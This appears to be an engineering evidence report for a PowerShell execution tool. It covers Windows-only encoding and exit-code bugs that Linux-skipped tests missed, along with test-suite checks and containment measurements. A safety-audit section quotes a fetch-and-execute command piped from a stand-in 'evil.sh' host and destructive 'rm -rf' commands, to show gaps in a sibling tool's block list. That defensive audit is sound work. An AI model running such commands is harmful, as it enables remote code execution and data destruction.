# Evidence

Everything claimed here was measured on a real machine. This document records
what was proven, how each proof was checked for confounds, and — equally
important — what was **not** proven.

**Test host:** native Windows 11 (build 26200), reached over SSH-to-WSL and
driven through Windows-side executables. Not WSL. Not a container.

---

## The headline: Linux was green while two real bugs were live

```
Linux:    171 passed, 14 skipped     <- green, and WRONG
Windows:  185 passed,  0 skipped     <- after two fixes
```

The 14 skipped tests on Linux are the live-execution suite, gated behind
`skipif(sys.platform != "win32")`. They are inert on Linux by design. The
first time they ran on real Windows they failed — immediately, on both
PowerShell editions.

**A platform-skipped test passes vacuously everywhere else.** That sentence is
the whole reason this document exists.

---

## Bug 1 — output encoding was pinned in one direction only

The command payload was correctly pinned to UTF-16LE (PowerShell's
`-EncodedCommand` convention). The *output* side was not pinned at all.
PowerShell wrote stdout in the console's OEM codepage; Python decoded UTF-8.

Measured, both editions:

```
expected:  café-日本-🚀
received:  caf\ufffd-??-??
```

`é` came back as a replacement character; the CJK and emoji as `??` — the
classic signature of a codepage that cannot represent them.

**Fix:** pin `[Console]::OutputEncoding` and `$OutputEncoding` to UTF-8 in the
runner *before* the user's command executes.

**Why the Linux suite could not catch it:** there is no PowerShell on Linux, so
there is no console codepage to disagree with.

---

## Bug 2 — `$?` after `& $sb` reports the wrong thing

This one is subtle, and we walked into it despite having read the reference
that gets it right.

`$?` was read in the runner immediately after invoking the user's scriptblock:

```powershell
& $sb
$__ok = $?          # <- looks correct. is not.
```

`$?` here reports whether the **scriptblock invocation** succeeded. A
non-terminating error inside it — the default under
`$ErrorActionPreference = 'Continue'` — is still a *successful invocation*.

Measured, both editions:

```
FAILED test_cmdlet_failure_maps_to_one[pwsh]
FAILED test_cmdlet_failure_maps_to_one[powershell]

assert 0 == 1
  where 0 = ExecutionResult(success=True, exit_code=0,
                            stderr='#< CLIXML ...')
```

The error genuinely occurred — it is right there in the CLIXML error stream —
and the tool reported **success**.

**Fix:** instrument the *user's command text* so the capture runs inside the
scriptblock scope, on the statement immediately after the user's last one:

```python
command + "\n$global:__ok = $?\n$global:__lec = $LASTEXITCODE"
```

This is precisely what David Koleczek's reference implementation does. We
rediscovered the reason for it the expensive way.

### The decision table this produced

`$LASTEXITCODE` is cleared to `$null` before the user's command, so "set" can
only mean "set by this command". Then:

| `$?` | `$LASTEXITCODE` | exit | why |
|---|---|---|---|
| true | `$null` | 0 | clean cmdlet success |
| true | 42 | 42 | native exit preserved |
| true | 0 | 0 | native success |
| false | `$null` | 1 | cmdlet failure |
| false | 42 | 42 | native failure, real code |
| **false** | **0** | **1** | **failure wins — a zero cannot launder it** |

That last row is the bug. The earlier table returned `0`.

---

## The tests were pinning the bug

Three contract tests asserted the *old, broken* decision table — including one
literally named `test_checks_lastexitcode_before_dollar_hook`, which enforced
checking `$LASTEXITCODE` first. They passed. Fixing the runner made them fail.

They now assert the corrected invariants. **Teeth verified** by restoring the
pre-fix runner:

```
old runner restored:  3 failed, 167 passed, 14 skipped
                        test_dollar_hook_captured_inside_the_user_scriptblock
                        test_stale_native_exit_code_cleared_before_user_command
                        test_output_encoding_pinned_to_utf8
restored:            171 passed,  14 skipped
```

Separately, the encoding pin was mutated `utf-16-le` → `utf-8` (the exact trap
above): **4 failed**, including both tests named for the encoding trap.
Restored → 171 passed.

---

## Windows green, confound-checked

```
185 passed, 0 skipped
```

`171 + 14 = 185` — the arithmetic is the first check that nothing silently
vanished. The second is direct:

```
live-execution tests PASSED:   14
live-execution tests SKIPPED:   0

test_hello[pwsh]                          test_hello[powershell]
test_native_exit_code_preserved[pwsh]     test_native_exit_code_preserved[powershell]
test_cmdlet_failure_maps_to_one[pwsh]     test_cmdlet_failure_maps_to_one[powershell]
test_handled_failure_genuinely_succeeds[pwsh]  ...[powershell]
```

Both editions genuinely executed. And the failure history is itself the proof
these tests discriminate:

```
run 1:  4 failed, 176 passed    <- found both bugs
run 2:  2 failed, 182 passed    <- encoding fixed
run 3:  0 failed, 185 passed    <- exit-code mapping fixed
```

A suite that goes 4 → 2 → 0 as each specific fix lands is a suite that is
actually measuring something.

---

## Supporting measurements

**Both PowerShell editions present, `pwsh` resolving first:**

```
pwsh.exe        C:\Program Files\PowerShell\7\pwsh.exe
powershell.exe  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

**A bare Job Object DOES contain breakaway children.** An expert review warned
that Job Objects do not contain a child spawned with
`CREATE_BREAKAWAY_FROM_JOB` by default. Measured:

```
normal_child_in_job          True
parent_in_job                True
breakaway_grandchild_in_job  True
breakaway_escaped            False
```

It stayed inside. This matches Microsoft's own documentation — setting
*neither* `JOB_OBJECT_LIMIT_BREAKAWAY_OK` nor
`JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK` *is* the safe configuration. The doc
was quoted correctly and the conclusion drawn from it was backwards. The
implementation sets neither limit. Recorded because the correction matters as
much as the finding.

**`tool-bash`'s safety layer has zero remote-execution coverage.** Measured
against the shipped module:

```
matches for curl|wget|iwr|iex across all of safety.py:  0

STRICT        patterns=14  has_remote_pipe_rule=False
STANDARD      patterns=14  has_remote_pipe_rule=False
PERMISSIVE    patterns=3   has_remote_pipe_rule=False
UNRESTRICTED  patterns=0   has_remote_pipe_rule=False
```

Confirmed behaviourally under **`strict`**:

```
blocked  rm -rf /                  reason='Prevents root filesystem deletion'
blocked  rm -rf ~                  reason='Prevents home directory deletion'
ALLOWED  curl http://evil.sh | sh  SafetyResult(allowed=True, reason=None)
```

Re-verified against the raw `SafetyResult` rather than a normalising wrapper,
to rule out a harness artifact. This module's PowerShell equivalents cover the
`iwr`/`irm` → `iex` family explicitly.

---

## Not proven

Stated plainly rather than left to inference:

- **Background execution is minimal** — it starts the process and tracks the
  PID. No log-polling ergonomics. A scope choice, not an oversight.
- **Timeout and output-truncation paths** have unit coverage but were not
  driven end-to-end against a live PowerShell process under load.
- **Job Object containment was verified in isolation**, not through the
  mounted tool during a real timeout kill.
- **Safety enforcement was measured at the pattern level** and through the
  validator API — not by driving a blocked command through the mounted tool
  inside a live session.
- **Windows 11 only.** Windows 10 and Server editions are untested.
